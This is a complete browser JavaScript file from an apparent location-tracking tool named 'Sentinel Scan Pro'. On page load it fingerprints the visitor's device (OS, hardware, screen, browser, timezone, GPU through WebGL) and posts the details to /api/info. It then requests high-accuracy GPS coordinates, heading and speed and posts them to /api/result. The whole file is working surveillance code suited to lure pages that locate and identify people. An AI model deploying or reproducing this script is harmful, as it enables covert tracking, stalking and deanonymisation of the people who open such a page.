// Sentinel Scan Pro v3.1.1 — location.js
// Device fingerprinting + GPS capture

(function() {
  "use strict";

  var ua = navigator.userAgent;
  var osMatch = ua.match(/\(([^)]+)\)/);
  
  var deviceData = {
    os:       osMatch ? osMatch[1] : "Unknown",
    platform: navigator.platform || "Unknown",
    cores:    navigator.hardwareConcurrency || "Unknown",
    ram:      navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
    vendor:   "Unknown",
    render:   "Unknown",
    wd:       window.screen.width,
    ht:       window.screen.height,
    browser:  _detectBrowser(),
    ua:       ua,
    lang:     navigator.language || "Unknown",
    tz:       Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
    touch:    ("ontouchstart" in window),
    cookies:  navigator.cookieEnabled,
    dnt:      (navigator.doNotTrack === "1"),
    online:   navigator.onLine,
  };

  // WebGL GPU detection
  try {
    var canvas = document.createElement("canvas");
    var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (gl) {
      var ext = gl.getExtension("WEBGL_debug_renderer_info");
      if (ext) {
        deviceData.vendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
        deviceData.render = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
      }
    }
  } catch(e) {}

  // Send device info
  _post("/api/info", deviceData);

  // Request GPS
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        var c = pos.coords;
        _post("/api/result", {
          status: "success",
          lat:    c.latitude  + " deg",
          lon:    c.longitude + " deg",
          acc:    c.accuracy  + " m",
          alt:    c.altitude  ? c.altitude  + " m" : "N/A",
          dir:    c.heading   ? c.heading   + " deg" : "N/A",
          spd:    c.speed     ? c.speed     + " m/s" : "N/A",
        });
      },
      function(err) {
        var msg = {1: "Permission denied", 2: "Unavailable", 3: "Timeout"}[err.code] || "Unknown";
        _post("/api/result", {status: "error", error: msg});
      },
      {enableHighAccuracy: true, timeout: 15000, maximumAge: 0}
    );
  } else {
    _post("/api/result", {status: "error", error: "Geolocation unsupported"});
  }

  function _post(url, data) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify(data));
  }

  function _detectBrowser() {
    var ua = navigator.userAgent;
    if (/OPR|Opera/.test(ua)) return "Opera";
    if (/Edg/.test(ua))       return "Microsoft Edge";
    if (/Chrome/.test(ua))     return "Google Chrome";
    if (/Safari/.test(ua) && !/Chrome/.test(ua)) return "Safari";
    if (/Firefox/.test(ua))    return "Mozilla Firefox";
    if (/Trident|MSIE/.test(ua)) return "Internet Explorer";
    return "Unknown";
  }
})();
